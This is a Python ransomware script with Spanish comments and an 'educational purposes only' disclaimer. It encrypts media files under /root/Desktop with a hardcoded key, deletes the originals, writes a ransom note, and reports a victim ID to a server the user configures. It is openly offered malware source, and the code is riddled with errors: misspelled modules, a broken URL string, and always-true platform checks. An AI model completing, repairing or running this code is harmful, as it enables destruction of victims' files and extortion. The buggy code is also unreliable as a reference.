# 	NO ME HAGO CARGO DEL MAL USO, SOLO FINES EDUCATIVOS.
#	Ransomware en Python3 para Linux
#	Para mas informacion lea el README
# 	Cifrado Basico
#	--> AUTOR: Manza <--
#	--> VERSION: 1.0 <--

import os, sys, subprocess, request, random, datetime, string

from simplecrypt import encrypt, decrypt
from Cryto.Cipher import AES
from Cryto.PublicKey import RSA

key = "Prueba" #Llave de recuperacion
ID = ""
msg = ""

chars_min = "qwertyuiopasdfghjklzxcvbnm"
chars_may = "QWERTYUIOPASDFGHJKLZXCVBNM"
nums = "0123456789"

path_linux = "/root/Desktop/"
extensiones = ['.mp4', 'jpg', '.png', '.mp3']		#Extensiones que van a ser infectados [Si añade bastante añada comas]

def gen_ID(size=10, caracteres = chars_min + chars_may + nums):
	global ID

	ID = ''.join(random.choise(caracteres) for _ in range(size))

def envio_ID():
	tiempo = datetime.datetime.now()
	servidor = "192.168.X.X"	#Aqui su servidor
	puerto = 80					#Aqui el puerto de su servidor
	url = index?Date= + str(tiempo) + "&clientID=" + str(ID)
	completo = 'http://' + servidor + "/" + url

	try:
		envio = request.get(completo)
	except Exception as Error:
		pass

def cifrado(key, archivo, salida_archivo=None, chucksize=64*1024):

	if not salida_archivo:
		salida_archivo = archivo + '.mz'	#Aqui la extension de salida

	filesize = os.path.getsize(archivo)

	with open(archivo, 'rb') as infile:
		with open(salida_archivo, 'wb') as outfile:
			cifrado = encrypt(key, infile.read())
			outfile.write(cifrado)
			outfile.close()


def mensaje():
	if os.getcwd():

		msg = """

		Esto es una prueba de ransomware para fines educativos, este es un mensaje de que tus archivos
		han sido encriptados, para poder desencriptarlos tendras que introducir la clave...

		""" #Aqui el mensaje de que ha sido cifrado

		file = open("como_recuperar_tus_archivos.txt", 'w')
		file.write(msg)
		file.close()

		abrir = "chmod +x como_recuperar_tus_archivos.txt && nano ./como_recuperar_tus_archivos.txt"
		os.system(abrir)
def archivos_infectados():
	archivos_infectados = []

	for root, dirs, files in os.walk(path_linux):
		for file in files:
			if file.endswith(extensiones):
				cifrado(key, os.path.join(root, file))
				os.remove(os.path.join(root, file))
	envio_ID()
if sys.platform == "linux" or "linux2":
	gen_ID()
	archivos_infectados()
	mensaje()
if sys.platform == "win32" or "windows":
	gen_ID()
	archivos_infectados()
	mensaje()

	#Esto es por si quieren que sea multiplataforma

else:
	print("Este ransomware no funciona en esta plataforma")